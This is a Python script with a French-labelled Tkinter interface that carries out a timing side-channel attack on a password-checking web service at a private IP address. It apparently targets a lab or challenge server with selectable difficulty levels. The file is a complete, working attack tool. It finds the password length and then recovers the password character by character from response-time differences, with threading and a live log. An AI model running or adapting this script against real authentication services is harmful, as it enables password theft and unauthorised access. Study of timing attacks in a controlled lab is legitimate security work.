import requests
import string
import tkinter as tk
from tkinter import ttk
from numpy import mean
import threading

class OnEstDesBrutesGUI:
    car = string.ascii_letters + string.digits

    def __init__(self, level: str = '0', occ: int = 1, password: str = ''):
        self.level = level
        self.occ = occ
        self.password = password
        self.last_time = len(password) * 17
        self.password_len = 0
        self.url = "http://192.168.137.146:5000"
        self.running = False
        
        # Initialisation de l'interface graphique
        self.root = tk.Tk()
        self.root.title("Timing Attack")
        self.root.geometry("600x400")
        
        # Frame principale
        self.main_frame = ttk.Frame(self.root, padding="10")
        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Labels pour afficher les informations
        self.password_label = ttk.Label(self.main_frame, text="Mot de passe actuel: ")
        self.password_label.grid(row=0, column=0, pady=15)
        
        self.current_try_label = ttk.Label(self.main_frame, text="Test actuel: ")
        self.current_try_label.grid(row=1, column=0, pady=0)
        
        self.time_label = ttk.Label(self.main_frame, text="Temps: 0ms")
        self.time_label.grid(row=2, column=0, pady=0)
        
        self.max_time_label = ttk.Label(self.main_frame, text="Lettre avec max temps: ")
        self.max_time_label.grid(row=3, column=0, pady=15)
        
        self.mean_time_label = ttk.Label(self.main_frame, text="Moyenne des temps: ")
        self.mean_time_label.grid(row=4, column=0, pady=5)
        
        # Bouton de démarrage
        self.start_button = ttk.Button(self.main_frame, text="Démarrer", command=self.start_attack)
        self.start_button.grid(row=5, column=0, pady=15)
        
        # Zone de log
        self.log_text = tk.Text(self.main_frame, height=10, width=70)
        self.log_text.grid(row=6, column=0, pady=10)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)

    def request_level(self, level: str):
        good = False
        while not good:
            json = {"level": level}
            response = requests.post(url=self.url + '/level', json=json, verify=False)
            if response.status_code == 200 and response.json().get('result', False):
                self.log(f'Level set: {level}')
                good = True
            else:
                self.log(f'Erreur : {response.status_code} : {response.text}')

    def request_pwd(self, letter: str):
        json = {"password": (self.password + letter).ljust(self.password_len, '0')}
        self.current_try_label.config(text=f"Test actuel: {json.get('password')}")
        self.root.update()
        
        response = requests.post(url=self.url + '/check', json=json, verify=False)
        if response.status_code == 200 or response.json()['result']:
            if response.json()['result']['Valid']:
                self.log(f'\nLe mot de passe est: {self.password + letter}')
                return None
            time = int(response.json()['result']['time'])
            self.time_label.config(text=f"Temps: {time}ms")
            return time
        else:
            self.log(f'Erreur : {response.status_code} : {response.text}')
            return None

    def brute_force_len_password(self):
        while self.request_pwd('') == 0:
            self.password_len += 1
        self.log(f'Longueur password: {self.password_len}\n')

    def max_time(self, temps: list[int]) -> int | None:
        tmp_mean = mean((temps[:i] + temps[i+1:]) or [0])
        self.mean_time_label.config(text=f"Moyenne des temps: {tmp_mean}")
        if len(temps) < 4:
            return None
        i = temps.index(max(temps))
        if temps[i] > tmp_mean + 15:
            return i

    def brute_force_char(self):
        time = []
        for l in self.car:
            if not self.running:
                return None
            time_char = []
            for _ in range(self.occ):
                t = -1
                while t < self.last_time:
                    t = self.request_pwd(l)
                    if t is None:
                        return None
                    print(self.password + l, t)
                time_char.append(t)
            time.append(mean(time_char))
            self.max_time_label.config(text=f"Lettre avec max temps: {self.car[time.index(max(time))]} ({max(time)}ms)")
            
            index = self.max_time(time)
            if index is not None:
                break

        self.password += self.car[time.index(max(time))]
        self.last_time = max(time) - 15
        self.password_label.config(text=f"Mot de passe actuel: {self.password}")
        self.log(f'Nouveau last_time: {self.last_time}')
        return True

    def brute_force_password(self):
        self.running = True
        self.request_level(self.level)
        self.brute_force_len_password()
        
        while self.running and self.brute_force_char():
            self.log(f'Le mot de passe commence par: {self.password}')
        
        if self.running:
            self.log("Attaque terminée!")
        else:
            self.log("Attaque arrêtée par l'utilisateur")

    def start_attack(self):
        self.start_button.config(state='disabled')
        thread = threading.Thread(target=self.brute_force_password)
        thread.start()

    def on_closing(self):
        self.running = False
        self.root.quit()

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = OnEstDesBrutesGUI(level='2', occ=4, password='Crab')
    app.run()